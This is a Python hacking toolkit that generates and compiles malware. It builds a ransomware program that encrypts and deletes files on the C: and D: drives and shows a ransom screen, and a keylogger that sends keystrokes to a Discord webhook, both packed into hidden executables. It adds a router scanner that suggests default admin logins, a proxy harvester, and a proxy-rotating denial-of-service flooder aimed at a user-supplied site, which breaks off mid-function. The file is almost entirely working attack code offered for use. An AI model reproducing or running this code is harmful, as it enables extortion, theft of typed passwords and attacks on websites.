import os
os.system("pip install discord.py pyautogui opencv-python numpy pyaudio aiohttp requests pillow keyboard")
import sys
import shutil
import tempfile
import subprocess
import discord
from discord.ext import commands
import pyautogui
import cv2
import webbrowser
import time
import numpy as np
import pyaudio
import wave
import asyncio
import threading
import aiohttp
import platform
import requests
import re
import winreg
import tkinter
import keyboard
from PIL import ImageGrab
import urllib.parse
def winlock():
    import os 
    logo = f'''
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*==##@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=###*.::#*@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+#%%%%##%%%%%#==%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%######%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%#######%%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%########%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%#########%#+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@%#########%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#########%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@=##@@%%%%%%%%%%%%@@@@#%@@@@@@@%#########%#@@@@@@@@@@@@@@@=+%%*###*+@#@@@@@@@@@@@@@@@@
    @@@@@@@@@@*%@@@%#####################%@@%#+@@%#########%%@@@@@@@@@*%%%%###############%%%#+@@@@@@@@@
    @#@@#@@#%@%%%#%%%%%%%%%%%%##############%@@@@###########*@@@@@%@%###############%%%%%%@%%%%%@%#*@@#@
    #-:.:%+#@@@@@@%%%%%@@@@@@@@@@%############%@@##########*-@@%#%#############%@@@@@@@%@@@@@@@@@%%-.:-#
    #+-:-*@@@@@@@@@@@@@@@@@@@@@@@@@%############%##########%%%%############%%@@@*@@@@@@@@@@@@@@@@@*-:=*#
    %%%%%@@@@@@@@@@@@@@@@@@@@@@@@%@@@%###########%%%%###%%@@@@%##########%@@%@@@@@@@@@@@@@@@@@@@@@@%%%%%
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@*@@@@%########################%%%#####%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@%%###############%%%##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@%%#########%%%########@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@%########%%######%###########%@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##########%###########%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@%%###############%@@%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@#-:-+%@%%#########%@@%=::+@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%#::::::#@%#####%%+:::::-#%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@###%%@%%@@%@%%%%%@@@%%##%%%%###%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%########%@%%%%%%%@%@%########%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=..=*%%%%%%*+%*:...-+*++#%%%%#+=...#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@===%=:=##%%**+=: ...:=*+%%##*=-%*==+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-@+..+*%-...*-..::.......-*:..-#+*:..#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##:.:-.*%#**#%*:.:....*%###%@-..+..**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*..-.:++::*#%%*:..-@%#+:-++..-..*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*#::..%@@%*-:++@@@#*:=*%@@-..:-#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*=:.*%##@@@@@@@@@@@@%*##..:**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*=*%%+*%#%@##%=#%%+=+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%=.-*%%%#%%%%%+::*%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+==:.-+*=-.:::*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*--+*##=-:==@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=-:...:=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*=*-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    '''
    print (logo)
    pasword = input("pasword:")
    print(r"Ransomware")
    print("Enter a photo name for Crypto-Ransomware, such as jester.png. IF YOU DON'T DO THIS, Crypto-Ransomware WILL NOT ROBOT. THIS PHOTO MUST BE IN THE FILE WITH Crypto-Ransomware ITSELF.")
    photo =input("photo:")
    print("Enter the message you want to leave for the Crypto-Ransomware victim, for example, a ransom note.")
    mas = input("massage:")
    code = f'''
    import os 
    import tkinter as tk
    from PIL import Image, ImageTk
    from pathlib import Path
    from cryptography.fernet import Fernet
    import shutil
    import os
    current_file_path = os.path.abspath(__file__)

    # Получаем папку, в которой находится файл
    current_folder = os.path.dirname(current_file_path)

    # ---------------- CONFIG ----------------
    PASSWORD = "{pasword}"          
    KEY_FILE = "secret.key"     
    ENC_EXT = ".enc"            
    BACKUP_DIR = Path("backups")
    BG_COLOR = "red"
    # Пути, которые не нужно трогать
    SYSTEM_PATHS_WINDOWS = {{r"C:\Windows", current_folder , r"C:\Program Files", r"C:\Program Files (x86)"}}
    SYSTEM_PATHS_UNIX = {{"/bin", "/sbin", "/boot", "/proc", "/sys", "/dev", "/run", "/usr", "/etc", "/"}}


    user = os.getlogin()
    TARGET_PATHS = [
        r"C:\",
        r"D:\"
    ]

    def scan_folders(path, max_depth=3, current_depth=0):
        if current_depth > max_depth:
            return
            
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    print(full_path)
                    # Рекурсивно заходим в папку, но не глубже max_depth
                    scan_folders(full_path, max_depth, current_depth + 1)
        except:
            pass

    for path in TARGET_PATHS:
        scan_folders(path)

    def is_system_path(p: Path) -> bool:
        s = str(p.resolve()).rstrip("\\/").lower()
        if os.name == "nt":
            for sp in SYSTEM_PATHS_WINDOWS:
                spn = sp.rstrip("\\/").lower()
                if s == spn or s.startswith(spn + "\\\\"):
                    return True
        else:
            for sp in SYSTEM_PATHS_UNIX:
                if s == sp or s.startswith(sp.rstrip("/") + "/"):
                    return True
        return False

    def safe_iter_files(root: Path, recursive: bool):
        if root.is_file():
            yield root
            return
        if not root.exists():
            return
        if recursive:
            for p in root.rglob('*'):
                if p.is_file():
                    yield p
        else:
            for p in root.iterdir():
                if p.is_file():
                    yield p

    def make_backup(src: Path):
        BACKUP_DIR.mkdir(exist_ok=True)
        dest = BACKUP_DIR / src.name
        i = 1
        while dest.exists():
            dest = BACKUP_DIR / f"{{src.name}}.bak{{i}}"
            i += 1
        shutil.copy2(src, dest)

    def get_or_create_key(key_file: str) -> bytes:
        key_path = Path(key_file)
        if key_path.exists():
            return key_path.read_bytes()
        key = Fernet.generate_key()
        key_path.write_bytes(key)
        print(f"[i] Новый ключ создан и сохранён: {{key_path.resolve()}}")
        return key


    def encrypt_files(paths, key_file=KEY_FILE, recursive=True):
        key = get_or_create_key(key_file)
        fernet = Fernet(key)
        for p in paths:
            rp = Path(p)
            if not rp.exists():
                print(f"[warn] путь не существует: {{rp}}")
                continue
            if is_system_path(rp):
                print(f"[refuse] Отказано (системный путь): {{rp}}")
                continue
            for f in safe_iter_files(rp, recursive):
                try:
                    make_backup(f)
                    data = f.read_bytes()
                    token = fernet.encrypt(data)
                    out_path = f.with_name(f.name + ENC_EXT)
                    out_path.write_bytes(token)
                    f.unlink()  # удаляем оригинал
                    print(f"[enc] {{f}} -> {{out_path}} (original deleted)")
                except Exception as e:
                    print(f"[skip] {{f}} (error: {{e}})")


    def decrypt_files(paths, key_file=KEY_FILE, recursive=True):
        key_path = Path(key_file)
        if not key_path.exists():
            print(f"[err] Файл ключа не найден: {{key_file}}")
            return
        key = key_path.read_bytes()
        fernet = Fernet(key)
        for p in paths:
            rp = Path(p)
            if not rp.exists():
                print(f"[warn] путь не существует: {{rp}}")
                continue
            if is_system_path(rp):
                print(f"[refuse] Отказано (системный путь): {{rp}}")
                continue
            for f in safe_iter_files(rp, recursive):
                try:
                    data = f.read_bytes()
                    plain = fernet.decrypt(data)
                    out_path = f.with_name(f.name[:-len(ENC_EXT)] if f.name.endswith(ENC_EXT) else f.name + ".dec")
                    make_backup(f)
                    out_path.write_bytes(plain)
                    f.unlink()  # удаляем зашифрованный файл
                    print(f"[dec] {{f}} -> {{out_path}}(encrypted deleted)")
                except Exception as e:
                    print(f"[skip] {{f}} (decrypt error: {{e}})")


    encrypt_files(TARGET_PATHS, recursive=True)

    root = tk.Tk()
    root.title("File Decryptor")
    root.attributes("-fullscreen", True)
    root.resizable(False, False)
    root.configure(bg=BG_COLOR)

    # Главный контейнер для организации layout
    main_frame = tk.Frame(root, bg=BG_COLOR)
    main_frame.pack(fill="both", expand=True, padx=20, pady=20)

    # Левый фрейм для маленького текста
    left_frame = tk.Frame(main_frame, bg=BG_COLOR)
    left_frame.pack(side="left", fill="y", padx=(0, 20))

    # Малый текст слева
    small_text = "Encrypted files"

    tk.Label(left_frame, text=small_text, fg="white", bg=BG_COLOR, 
            font=("Courier", 9), justify="left").pack(pady=10)

    # Правый фрейм для основного контента
    right_frame = tk.Frame(main_frame, bg=BG_COLOR)
    right_frame.pack(side="right", fill="both", expand=True)
    current_file_path = os.path.abspath(__file__)

    # Получаем папку, в которой находится файл
    current_folder = os.path.dirname(current_file_path)
    print(current_folder)
    # Основной контент (перенесен в правый фрейм)
    image = Image.open("{photo}")
    width, height = image.size
    image = image.resize((width//1, height//1))
    photo = ImageTk.PhotoImage(image)
    label = tk.Label(right_frame, bg=BG_COLOR, image=photo)
    label.pack(pady=20)

    tk.Label(right_frame, text="All your files have the .enc extension.😅😅😅", 
            fg="white", bg=BG_COLOR, font=("Courier", 24)).pack()
    tk.Label(right_frame, text="Create Crypto-Ransomware for phlypopica GITHUB-https://github.com/Fsociety1146", 
            fg="white", bg=BG_COLOR, font=("Courier", 24)).pack()

    entry = tk.Entry(right_frame, width=40, show="*")
    entry.pack(pady=10)

    # Статус
    status_label = tk.Label(right_frame, font=("Courier", 24), fg='white', 
                        bg=BG_COLOR, text="")
    status_label.pack(pady=10)

    def unlock():
        if entry.get() == PASSWORD:
            decrypt_files(TARGET_PATHS, recursive=True)
            status_label.config(text="Decryption complete ✅", fg="green")
            root.after(2000, root.destroy)
        else:
            status_label.config(text="False password 😅")
            root.after(1000, lambda: status_label.config(text=""))

    # Кнопка только для расшифровки
    tk.Button(right_frame, text="Decrypt", fg="white", font=("Courier", 24), 
            bg=BG_COLOR, command=unlock).pack(pady=5)

    tk.Label(right_frame, text="{mas}", 
            fg="white", bg=BG_COLOR, font=("Courier", 24)).pack()


    root.mainloop()
    '''

    with open("winlock.py", "w", encoding="utf-8") as f:
        f.write(code)

    os.system("pyinstaller --onefile --noconsole winlock.py")

def keylogger():
    logo =f'''
.:-.::........:::::::::::::::::::::.:.::::::::::::::::....::::::::::::::::::::::::::::::::::::::::--
-.::......:-:::..::::--------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-+###*=.-=:::::.....=-:::::--========---::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
......:+++*%#*+=..=-::........==::---==++++++==--::::::::=**++=*#%%%%#*+***+::::::::::::::::::::::::
......=-:-:...:-=*####*=-:..:+:.........:*+-=++++++++**=......:##-..::-=*#*#%##*::::::::::::::::::::
...:=:::.........=::-::=+***##*+=-::...-+:.......-*=:....::..=*#-..:......:-::-###*-::::::::::::::::
@###*+=:......:+:::.........+=-=+*%%#=**=-::...**#*+=-::-:.:##*:..............=##:.:*=::::::::::::::
....:*%@@@%+-*=:--:.......=+:.::......:+#%%%%%*=#%%@@@%#*-=##+.:--:......::..+*#=..:::#+::::::::::::
....+:-=-:::=*+*@%%#+-:.=*:--:........:*=.:-#+.:%*-::..-*#*#%@###*+:::..-:..##%-.......:#+=-::::::::
.-+:::::.......-::-=*#%##%#*=-::.....*+:..+*-.+*#::--:-....::::=#%@@@%#**+:##%:.---.....:*******++=-
*::::........-*=::-::.:..::*%@@@%#-*#=:::**=-##+::........::::..#+=:.-=*%%##%@##*+=:.....:*=--=+****
++@%#+=:...-*-:::::::.....+#::-=:-=*#%@%%#=###:::::::::..:::..-*#*:..=:....::-+#%@@@%##**+=*=:::::::
.:::=#%@@%#%#=:::::::...=*=:::::::::...+#*##%%#*:::::::::::..###*..........:--=::#*##*#%@@@@#.:::::.
:::.......++-+@@%%#*=.:#*:::::::::::..*##::#%%%@@@%##*=--:..%#%+..........::::..*#%=.--=::.-**#*=-:=
:........:*-:--::=*%@%#%%#+=:::::::.=##**:.=**=::=*%@@@@%#+%#%*::......::::::..##%*..:--=::::#*++###
=......-*=:::-:::::::.=**+%@@@%#*+.##-:#+.#*%-::=::::::-+%#%%@@@%##*=:::::::..%#%#.....::::::+-:--.:
%*:..:#+::::::::::.:.:##:=:::::*%%#%@%###%#%:::::::::::::-::-+%%##%@@@%#**#=.@%%#.:.:::::::::=-...::
@@@@@#%*-::::::::..:##::::::::::::.+*#**#%=:::::::::::::::..%%#.:::..*#%%@@@%#%@*+-::::::::::===::::
-:.-=*#+@@@%#+=-..*#=:::::::::::..+#%-:+*::::::::::::::::.:##%=:=-=:::::::.==*#%@@@%%##+=-:::%+=::::
:::.....%+*%%@@@%#%#+::::::::::.:%#*:::+#+*+-:::-:::::::.=%%%-::::::::::::+::..###%#%%%@@@%**%#%@@%#
:::.:.:##:=-*-::=%%#%@@%##+:::.#%%-:::::##%@@%%##*-:::..%%%%:::::::::::::::::.%#%*::-:::.#%##+:-+##*
:::.:%%=::-=-:::::::-%#%@@@@@*@#%-::::.:-#*%%@@@@@@##*-@#%#::::::::::::::::..%#%#::+-:::::::#:.#%#*:
:::%#=--::::::::::..*#*:=::-*#%%@@@%%#+=:+#*#*+.=+%%%@%%%@@##+=:::::::::::.:%#%@::::::::::-%-:**%@::
*##%-----::::::::.+%%-:-:+=::::::-=%%@@@@@###-:++:::::-+%%%%@@@@%##*+:::::.%#%%-:::::::::-%-::*%@+::
@@@@@##*:::::::..%#=:::::::::::::.-%*=::-%%%##-:+*=+-::::::::#%%%@@@@@*#*:@#%@::::::::::=%%*=%#%@:::
++***#@@@@%##+.=*%::::::::::::::.+#%--+-:--::*#*-:::::::-=+:.-+##=:*#%%%@%%@@%##=-::::-%@%-**#%%@%%%
::::-=++*##%@@@%@%*=-:::::::::..##%::::::=:::--##+-::::::::.=#%%-::-::::=+#%%%@@@%%%##%@@##--=::####
::::::::::-=++*#%%%@@@#*+=:::.-#%#::::::::::::::.*#*=:::::.*#%%=::-:::::::::::-=*#*%%@@@@%#**=:-%#%#
::::::::::::::::-=++*#@@@@@#+#*%+::::::::::::::.%#%-*#**:.%#%%=:::::::::::::::-*#%@=:::=@@@%#*###@%=
::::::::::::::::::::::-=++*%%@@@%##+-::::-=--:.%%%=:::::##***=-:::::::::-+**#%@%#*-::::::=%@@%###%@:
::::::::::::::::::::::::::::-=++##@@@@%#*=--::%%%-::::::::::::+**%%#*+-=::::=+#%%@@@%%#*=--=%@@%#*#+
::::::::::::::::::::::::::::::::::-=+*#@@@#%#%%@=:-::::::::::::.##@%::::::::::::::-##%%@@@%##+%@%%#*
::::::::::::::::::::::::::::::::::::::::-=+*#@@@@%#*=-::::::::.#%@@-::::::::::::=::@*+++-+####%@%@@%
'''
    print(logo)
    print("discord keylogger")
    url = input("webgook-url:")
    logger = f'''
import keyboard
import requests
import time
import threading

WEBHOOK_URL = "{url}"

keys_buffer = []
last_send_time = time.time()

def send_keys():
    global keys_buffer, last_send_time
    
    if keys_buffer and time.time() - last_send_time >= 1.0:  # Отправка каждую секунду
        current_batch = keys_buffer.copy()
        keys_buffer.clear()
        
        if len(current_batch) > 20:  # Ограничиваем размер сообщения
            current_batch = current_batch[:20]
            
        message = " " + " ".join([f"`{{k}}`" for k in current_batch])
        data = {{"content": message}}
        
        try:
            requests.post(WEBHOOK_URL, json=data, timeout=3)
            print(f"⚡ Отправлено {{len(current_batch)}} клавиш")
        except:
            print("⚠️ Ошибка отправки")
            
        last_send_time = time.time()

def auto_sender():
    while True:
        send_keys()
        time.sleep(0.01)  # Проверка каждые 0.5 секунд

def on_key_press(event):
    if event.event_type == keyboard.KEY_DOWN:
        keys_buffer.append(event.name)
        # Авто-отправка при быстром наборе
        if len(keys_buffer) >= 5:
            send_keys()

# Запускаем авто-отправку в отдельном потоке
threading.Thread(target=auto_sender, daemon=True).start()

print("⚡ Сверхбыстрое отслеживание запущено!")
keyboard.hook(on_key_press)
keyboard.wait()


'''

    with open("keylogger.py", "a", encoding="utf-8") as f:
        f.write(f"{logger}\n")
    os.system("pyinstaller --onefile --noconsole keylogger.py")
def ipin():
    import socket
    import requests
    import re
    lele = f'''
░██████░█████████       ░██████                                    
  ░██  ░██     ░██     ░██   ░██                                   
  ░██  ░██     ░██    ░██          ░███████   ░██████   ░████████  
  ░██  ░█████████      ░████████  ░██    ░██       ░██  ░██    ░██ 
  ░██  ░██                    ░██ ░██         ░███████  ░██    ░██ 
  ░██  ░██             ░██   ░██  ░██    ░██ ░██   ░██  ░██    ░██ 
░██████░██              ░██████    ░███████   ░█████░██ ░██    ░██ 
                                                                   
                                                                   
                                                                   
'''
    print(lele)
    def get_router_info_by_ip(target_ip):
        print(f"\nAnalyzing router: {target_ip}")
        
        common_routers = {
            '192.168.1.1': ['TP-Link', 'D-Link', 'ASUS', 'Cisco', 'Linksys'],
            '192.168.0.1': ['TP-Link', 'Netgear', 'D-Link', 'Belkin'],
            '192.168.10.1': ['Zyxel', 'Keenetic', 'Xiaomi'],
            '192.168.31.1': ['Xiaomi', 'Redmi'],
            '192.168.100.1': ['Huawei', 'ZTE', 'Sagemcom'],
            '192.168.8.1': ['Huawei 4G/5G'],
            '10.0.0.1': ['Apple', 'Arris'],
            '192.168.12.1': ['Huawei'],
            '192.168.50.1': ['ASUS'],
            '192.168.3.1': ['Tenda'],
        }
        
        if target_ip in common_routers:
            print(f"This IP is commonly used by: {', '.join(common_routers[target_ip])}")
        
        print("\n1. Getting external IP information...")
        try:
            external_ip = requests.get(f'http://ip-api.com/json/{target_ip}')
            data = external_ip.json()
            print(f"IP: {data['query']}")
            print(f"Country: {data['country']}")
            print(f"City: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"Coordinates: {data['lat']}, {data['lon']}")
            gelo = f"https://www.google.com/maps/place/{data['lat']},{data['lon']}"
            print(f"Google Maps: {gelo}")
        except Exception as e:
            print(f"Error getting external IP info: {e}")
        
        print("\n2. Searching for hostname...")
        try:
            hostname = socket.gethostbyaddr(target_ip)
            print(f"Hostname: {hostname[0]}")
            
            hostname_lower = hostname[0].lower()
            if 'asus' in hostname_lower:
                print("Likely: ASUS router")
            elif 'tplink' in hostname_lower or 'tp-link' in hostname_lower:
                print("Likely: TP-Link router")
            elif 'keenetic' in hostname_lower:
                print("Likely: Zyxel/Keenetic router")
            elif 'dlink' in hostname_lower or 'd-link' in hostname_lower:
                print("Likely: D-Link router")
                
        except socket.herror:
            print("Hostname: could not be determined")
        except Exception as e:
            print(f"Error getting hostname: {e}")
        
        print("\n3. Checking ports...")
        common_ports = [80, 443, 8080, 22, 23, 21]
        
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    service = {
                        80: "HTTP (Web interface)",
                        443: "HTTPS (Secure web interface)", 
                        8080: "Alternative web interface",
                        22: "SSH",
                        23: "Telnet",
                        21: "FTP"
                    }.get(port, f"Port {port}")
                    print(f"Open: {service}")
                sock.close()
            except:
                pass
        
        print("\n4. Analyzing web interface...")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        for port in [80, 443, 8080]:
            try:
                if port == 443:
                    url = f"https://{target_ip}"
                else:
                    url = f"http://{target_ip}:{port}"
                
                response = requests.get(url, timeout=5, headers=headers, verify=False)
                
                content_lower = response.text.lower()
                
                manufacturers = {
                    'asus': 'ASUS',
                    'tplink': 'TP-Link', 
                    'tp-link': 'TP-Link',
                    'd-link': 'D-Link',
                    'dlink': 'D-Link',
                    'zyxel': 'Zyxel',
                    'keenetic': 'Keenetic',
                    'netgear': 'Netgear',
                    'linksys': 'Linksys',
                    'xiaomi': 'Xiaomi',
                    'huawei': 'Huawei',
                    'tenda': 'Tenda',
                    'mercusi': 'Mercusys'
                }
                
                found_manufacturers = []
                for key, value in manufacturers.items():
                    if key in content_lower:
                        found_manufacturers.append(value)
                
                if found_manufacturers:
                    print(f"Web interface found: {url}")
                    print(f"Detected: {', '.join(set(found_manufacturers))}")
                    
                    title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
                    if title_match:
                        print(f"Page title: {title_match.group(1)}")
                    break
                    
            except requests.exceptions.RequestException:
                continue
            except Exception as e:
                continue
        
        print("\n5. Recommendations:")
        if 80 in open_ports or 443 in open_ports:
            if 80 in open_ports:
                print(f"Open in browser: http://{target_ip}")
            if 443 in open_ports:
                print(f"Or: https://{target_ip}")
            print("Default login/password often: admin/admin")
        else:
            print("Web interface not detected")

    def main():
        print("Router Information Detector")
        print("=" * 40)
        
        while True:
            ip = input("\nEnter router IP (or 'q' to exit): ").strip()
            
            if ip.lower() in ['quit', 'exit', 'q']:
                break
                
            ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
            if not ip_pattern.match(ip):
                print("Invalid IP format!")
                continue
                
            try:
                socket.inet_aton(ip)
                get_router_info_by_ip(ip)
            except socket.error:
                print("Invalid IP address!")
                continue

    if __name__ == "__main__":
        main()
def farm():
    logo =f'''
                                                                                                                        
   mmmm                                            mm                  mmmmmm                                           
 m#""""#                                           ##                  ##""""#m                                         
 ##m        m####m    m#####m   ##m####   m#####m  ##m####m            ##    ##   ##m####   m####m   "##  ##"  "##  ### 
  "####m   ##mmmm##   " mmm##   ##"      ##"    "  ##"   ##            ######"    ##"      ##"  "##    ####     ##m ##  
      "##  ##""""""  m##"""##   ##       ##        ##    ##            ##         ##       ##    ##    m##m      ####"  
 #mmmmm#"  "##mmmm#  ##mmm###   ##       "##mmmm#  ##    ##            ##         ##       "##mm##"   m#""#m      ###   
  """""      """""    """" ""   ""         """""   ""    ""            ""         ""         """"    """  """     ##    
                                                                                                                ###     
                                                                                                                        
'''
    print(logo)
    import requests
    import concurrent.futures
    from bs4 import BeautifulSoup

    def get_proxies_from_github():
        url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        response = requests.get(url)
        proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
        return proxies

    def get_proxies_from_advanced():
        url = "https://advanced.name/freeproxy/68e67e6b7d3b3"
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            proxies = []
            table = soup.find('table', {'id': 'table_proxies'})
            if table:
                rows = table.find_all('tr')[1:]
                for row in rows:
                    cells = row.find_all('td')
                    if len(cells) >= 2:
                        ip = cells[0].text.strip()
                        port = cells[1].text.strip()
                        if ip and port:
                            proxies.append(f"{ip}:{port}")
            return proxies
        except:
            return []

    def check_proxy(proxy):
        try:
            response = requests.get(
                "http://httpbin.org/ip",
                proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                timeout=3
            )
            if response.status_code == 200:
                return proxy
        except:
            pass
        return None

    def main():
        print("scan proxy from github")
        print("true proxies will be saved in proxy.txt")
        
        all_proxies = []
        
        github_proxies = get_proxies_from_github()
        all_proxies.extend(github_proxies)
        
        advanced_proxies = get_proxies_from_advanced()
        all_proxies.extend(advanced_proxies)
        
        working_proxies = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(check_proxy, proxy) for proxy in all_proxies]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    working_proxies.append(result)
                    print(f" {result}")
                    with open("proxy.txt", "a", encoding="utf-8") as f:
                        f.write(f"{result}\n")
        
        print(f"\n{len(working_proxies)}")

    if __name__ == "__main__":
        main()

def dos_proxy():
    import requests
    import threading
    import time
    from concurrent.futures import ThreadPoolExecutor, as_completed
    print("proxies must be in proxy.txt")
    print("Write the link here, changing it, for example, from https://medinaschool.org/ to http://medinaschool.org/")
    xx = input("url:")
    
    class ProxyRotator:
        def __init__(self, proxy_list, requests_per_proxy=5):
            self.proxy_list = proxy_list
            self.requests_per_proxy = requests_per_proxy
            self.current_proxy_index = 0
            self.request_count = 0
            self.lock = threading.Lock()
        
        def get_next_proxy(self):
            with self.lock:
                self.request_count += 1
                
                if self.request_count >= self.requests_per_proxy:
                    self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
                    self.request_count = 0
                
                return self.proxy_list[self.current_proxy_index]

    def load_proxies_from_file(filename="proxy.txt"):
        """Загрузка прокси из файла"""
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                proxies = [line.strip() for line in file if line.strip() and ':' in line]
            
            print(f"download {len(proxies)} proxy from file  {filename}")
            return proxies
        
        except FileNotFoundError:
            print(f" file {filename} no found")
            print("go use farm proxy")
            return []
        except Exception as e:
            print(f"❌ erorr: {e}")
            return []

    def make_detailed_request(url, proxy_rotator, session, request_number, headers=None, timeout=5):
        """Детальный запрос с полной информацией"""
        proxy_addr = proxy_rotator.get_next_proxy()
        
        try:
            proxies = {
                'http': f'http://{proxy_addr}',
                'https': f'http://{proxy_addr}'
            }
            
            start_time = time.time()
            response = session.get(url, proxies=proxies, headers=headers, timeout=timeout)
            end_time = time.time()
            
            # Получаем информацию о редиректах
            redirects = []
            if response.history:
                for resp in response.history:
                    redirects.append(f"{resp.status_code}->{resp.url}")
            
            return {
                'status': 'success',
                'request_number': request_number,
                'proxy': proxy_addr,
                'url': response.url,  # Финальный URL (после редиректов)
                'status_code': response.status_code,
                'response_time': end_time - start_time,
                'content_length': len(response.content),
                'redirects': ' -> '.join(redirects) if redirects else 'нет',
                'headers_received': dict(response.headers)
            }
        except Exception as e:
            return {
                'status': 'error', 
                'request_number': request_number,
                'proxy': proxy_addr,
                'url': url,
                'error': str(e),
                'response_time': 0
            }

    def detailed_attack(url, proxy_list, num_requests=100, max_workers=20, requests_per_proxy=5):
        """Атака с детальным выводом информации"""
        
        if not proxy_list:
            print("❌ Нет прокси для работы!")
            return
        
        proxy_rotator = ProxyRotator(proxy_list, requests_per_proxy)
        
        # Заголовки для имитации браузера
        headers = {
